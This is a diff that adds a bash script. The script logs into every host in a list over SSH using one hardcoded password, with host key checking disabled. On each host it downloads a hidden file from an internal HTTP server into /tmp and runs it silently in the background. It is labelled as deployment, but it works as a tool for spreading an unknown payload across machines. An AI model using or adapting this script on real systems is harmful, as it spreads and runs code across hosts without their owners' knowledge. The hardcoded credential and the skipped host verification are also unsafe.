@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# Configuration
+USER_FILE="linux.txt"  # File containing list of hosts (one per line)
+TARGET_DIR="/tmp"      # Directory to download and execute the file
+REMOTE_FILE=".gumper.lin"  # Name of the file to download and execute
+DOWNLOAD_URL="http://10.0.0.13:8000/"  # URL to download the file from
+SSH_PASSWORD="Passw0rd123!"  # SSH password for all hosts
+
+# Commands
+CURL_COMMAND="wget -q -O $TARGET_DIR/$REMOTE_FILE $DOWNLOAD_URL && chmod +x $TARGET_DIR/$REMOTE_FILE"
+EXECUTE_COMMAND="nohup $TARGET_DIR/$REMOTE_FILE > /dev/null 2>&1 &"
+
+# Validate input file
+if [ ! -f "$USER_FILE" ]; then
+    echo "Error: The file $USER_FILE does not exist."
+    exit 1
+fi
+
+# Process each host
+while IFS= read -r host; do
+    # Skip empty lines
+    if [ -z "$host" ]; then
+        continue
+    fi
+
+    echo "Processing host: $host"
+
+    # Download and set permissions
+    if ! sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$host" "$CURL_COMMAND"; then
+        echo "Failed to download file on $host"
+        continue
+    fi
+
+    # Execute the file
+    if ! sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$host" "$EXECUTE_COMMAND"; then
+        echo "Failed to execute file on $host"
+        continue
+    fi
+
+    echo "Successfully deployed to $host"
+done < "$USER_FILE"
+
+echo "Deployment complete."
